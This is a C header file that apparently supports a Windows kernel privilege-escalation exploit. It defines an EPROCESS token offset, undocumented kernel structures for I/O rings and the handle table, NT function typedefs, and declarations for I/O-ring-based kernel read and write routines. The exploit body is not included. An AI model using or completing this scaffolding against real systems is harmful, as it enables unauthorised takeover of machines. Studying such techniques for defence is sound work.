#pragma once
#include <Windows.h>
#include <winternl.h>

#define EPROCESS_TOKEN_OFFSET 0x4b8

#define SystemHandleInformation (SYSTEM_INFORMATION_CLASS)16

typedef struct _OBJECT_TYPE_INFORMATION
{
    UNICODE_STRING TypeName;
    ULONG TotalNumberOfObjects;
    ULONG TotalNumberOfHandles;
    ULONG TotalPagedPoolUsage;
    ULONG TotalNonPagedPoolUsage;
    ULONG TotalNamePoolUsage;
    ULONG TotalHandleTableUsage;
    ULONG HighWaterNumberOfObjects;
    ULONG HighWaterNumberOfHandles;
    ULONG HighWaterPagedPoolUsage;
    ULONG HighWaterNonPagedPoolUsage;
    ULONG HighWaterNamePoolUsage;
    ULONG HighWaterHandleTableUsage;
    ULONG InvalidAttributes;
    GENERIC_MAPPING GenericMapping;
    ULONG ValidAccessMask;
    BOOLEAN SecurityRequired;
    BOOLEAN MaintainHandleCount;
    BOOLEAN TypeIndex;
    CHAR ReservedByte;
    ULONG PoolType;
    ULONG DefaultPagedPoolCharge;
    ULONG DefaultNonPagedPoolCharge;
} OBJECT_TYPE_INFORMATION, * POBJECT_TYPE_INFORMATION;

typedef struct _SYSTEM_HANDLE_TABLE_ENTRY_INFO {
    USHORT UniqueProcessId;
    USHORT CreatorBackTraceIndex;
    UCHAR ObjectTypeIndex;
    UCHAR HandleAttributes;
    USHORT HandleValue;
    PVOID Object;
    ULONG GrantedAccess;
    LONG __PADDING__[1];
} SYSTEM_HANDLE_TABLE_ENTRY_INFO, * PSYSTEM_HANDLE_TABLE_ENTRY_INFO;

typedef struct _SYSTEM_HANDLE_INFORMATION {
    ULONG NumberOfHandles;
    SYSTEM_HANDLE_TABLE_ENTRY_INFO Handles[1];
} SYSTEM_HANDLE_INFORMATION, * PSYSTEM_HANDLE_INFORMATION;

typedef struct _DISPATCHER_HEADER
{
    union
    {
        volatile LONG Lock;
        LONG LockNV;
        struct
        {
            UCHAR Type;
            UCHAR Signalling;
            UCHAR Size;
            UCHAR Reserved1;
        };
        struct
        {
            UCHAR TimerType;
            union
            {
                UCHAR TimerControlFlags;
                struct
                {
                    struct
                    {
                        UCHAR Absolute : 1;
                        UCHAR Wake : 1;
                        UCHAR EncodedTolerableDelay : 6;
                    };
                    UCHAR Hand;
                    union
                    {
                        UCHAR TimerMiscFlags;
                        struct
                        {
                            UCHAR Index : 6;
                            UCHAR Inserted : 1;
                            volatile UCHAR Expired : 1;
                        };
                    };
                };
            };
        };
        struct
        {
            UCHAR Timer2Type;
            union
            {
                UCHAR Timer2Flags;
                struct
                {
                    struct
                    {
                        UCHAR Timer2Inserted : 1;
                        UCHAR Timer2Expiring : 1;
                        UCHAR Timer2CancelPending : 1;
                        UCHAR Timer2SetPending : 1;
                        UCHAR Timer2Running : 1;
                        UCHAR Timer2Disabled : 1;
                        UCHAR Timer2ReservedFlags : 2;
                    };
                    UCHAR Timer2ComponentId;
                    UCHAR Timer2RelativeId;
                };
            };
        };
        struct
        {
            UCHAR QueueType;
            union
            {
                UCHAR QueueControlFlags;
                struct
                {
                    struct
                    {
                        UCHAR Abandoned : 1;
                        UCHAR DisableIncrement : 1;
                        UCHAR QueueReservedControlFlags : 6;
                    };
                    UCHAR QueueSize;
                    UCHAR QueueReserved;
                };
            };
        };
        struct
        {
            UCHAR ThreadType;
            UCHAR ThreadReserved;
            union
            {
                UCHAR ThreadControlFlags;
                struct
                {
                    struct
                    {
                        UCHAR CycleProfiling : 1;
                        UCHAR CounterProfiling : 1;
                        UCHAR GroupScheduling : 1;
                        UCHAR AffinitySet : 1;
                        UCHAR Tagged : 1;
                        UCHAR EnergyProfiling : 1;
                        UCHAR SchedulerAssist : 1;
                        UCHAR ThreadReservedControlFlags : 1;
                    };
                    union
                    {
                        UCHAR DebugActive;
                        struct
                        {
                            UCHAR ActiveDR7 : 1;
                            UCHAR Instrumented : 1;
                            UCHAR Minimal : 1;
                            UCHAR Reserved4 : 2;
                            UCHAR AltSyscall : 1;
                            UCHAR Emulation : 1;
                            UCHAR Reserved5 : 1;
                        };
                    };
                };
            };
        };
        struct
        {
            UCHAR MutantType;
            UCHAR MutantSize;
            UCHAR DpcActive;
            UCHAR MutantReserved;
        };
    };
    long SignalState;
    LIST_ENTRY WaitListHead;
} DISPATCHER_HEADER, * PDISPATCHER_HEADER;


typedef struct _KEVENT
{
    DISPATCHER_HEADER Header;
} KEVENT, * PKEVENT;


typedef NTSTATUS(WINAPI* PNtCreateFile)(
    PHANDLE FileHandle, 
    ACCESS_MASK DesiredAccess, 
    POBJECT_ATTRIBUTES ObjectAttributes, 
    PIO_STATUS_BLOCK IoStatusBlock, 
    PLARGE_INTEGER AllocationSize, 
    ULONG FileAttributes, 
    ULONG ShareAccess, 
    ULONG CreateDisposition, 
    ULONG CreateOptions,
    PVOID EaBuffer, 
    ULONG EaLength
);

typedef NTSTATUS(WINAPI* PNtDeviceIoControlFile)(
    HANDLE FileHandle, 
    HANDLE Event, 
    PVOID ApcRoutine,
    PVOID ApcContext, 
    PIO_STATUS_BLOCK IoStatusBlock, 
    ULONG IoControlCode, 
    PVOID InputBuffer, 
    ULONG InputBufferLength, 
    PVOID OutputBuffer, 
    ULONG OutputBufferLength
);

typedef NTSTATUS(WINAPI* PNtCreateIoCompletion)(
    PHANDLE IoCompletionHandle, 
    ACCESS_MASK DesiredAccess, 
    POBJECT_ATTRIBUTES ObjectAttributes, 
    ULONG NumberOfConcurrentThreads
);

typedef NTSTATUS(WINAPI* PNtSetIoCompletion)(
    HANDLE IoCompletionHandle, 
    ULONG CompletionKey,
    PIO_STATUS_BLOCK IoStatusBlock, 
    NTSTATUS CompletionStatus, 
    ULONG NumberOfBytesTransferred
);

typedef NTSTATUS(WINAPI* PNtQuerySystemInformation)(
    SYSTEM_INFORMATION_CLASS SystemInformationClass, 
    PVOID SystemInformation, 
    ULONG SystemInformationLength, 
    PULONG ReturnLength
);

// ioring
typedef struct _NT_IORING_CREATE_FLAGS
{
    enum _NT_IORING_CREATE_REQUIRED_FLAGS Required;
    enum _NT_IORING_CREATE_ADVISORY_FLAGS Advisory;
} NT_IORING_CREATE_FLAGS, * PNT_IORING_CREATE_FLAGS;

typedef struct _NT_IORING_INFO
{
    enum IORING_VERSION IoRingVersion;
    struct _NT_IORING_CREATE_FLAGS Flags;
    UINT SubmissionQueueSize;
    UINT SubmissionQueueRingMask;
    UINT CompletionQueueSize;
    UINT CompletionQueueRingMask;
    struct _NT_IORING_SUBMISSION_QUEUE* SubmissionQueue;
    struct _NT_IORING_COMPLETION_QUEUE* CompletionQueue;
} NT_IORING_INFO, * PNT_IORING_INFO;

typedef struct _IOP_MC_BUFFER_ENTRY
{
    USHORT Type;
    USHORT Reserved;
    ULONG Size;
    ULONG ReferenceCount;
    ULONG Flags;
    LIST_ENTRY GlobalDataLink;
    PVOID Address;
    ULONG Length;
    CHAR AccessMode;
    ULONG MdlRef;
    struct _MDL* Mdl;
    KEVENT MdlRundownEvent;
    PULONG64 PfnArray;
    BYTE PageNodes[0x20];
} IOP_MC_BUFFER_ENTRY, * PIOP_MC_BUFFER_ENTRY;

typedef struct _IORING_OBJECT
{
    SHORT Type;
    SHORT Size;
    NT_IORING_INFO UserInfo;
    PVOID Section;
    struct _NT_IORING_SUBMISSION_QUEUE* SubmissionQueue;
    struct _MDL* CompletionQueueMdl;
    struct _NT_IORING_COMPLETION_QUEUE* CompletionQueue;
    ULONG64 ViewSize;
    LONG InSubmit;
    ULONG64 CompletionLock;
    ULONG64 SubmitCount;
    ULONG64 CompletionCount;
    ULONG64 CompletionWaitUntil;
    KEVENT CompletionEvent;
    UCHAR SignalCompletionEvent;
    PKEVENT CompletionUserEvent;
    UINT RegBuffersCount;
    PIOP_MC_BUFFER_ENTRY* RegBuffers;
    UINT RegFilesCount;
    PVOID* RegFiles;
} IORING_OBJECT, * PIORING_OBJECT;

typedef struct _HIORING
{
    HANDLE handle;
    NT_IORING_INFO Info;
    ULONG IoRingKernelAcceptedVersion;
    PVOID RegBufferArray;
    ULONG BufferArraySize;
    PVOID Unknown;
    ULONG FileHandlesCount;
    ULONG SubQueueHead;
    ULONG SubQueueTail;
}_HIORING;

typedef struct _PIPE_HANDLES{
    HANDLE r;
    HANDLE w;
} PIPE_HANDLES;

LONG PrepareIoRing();
LONG IoRingRead(PULONG64, PVOID, PVOID, ULONG);
LONG IoRingWrite(PULONG64, PVOID, PVOID, ULONG);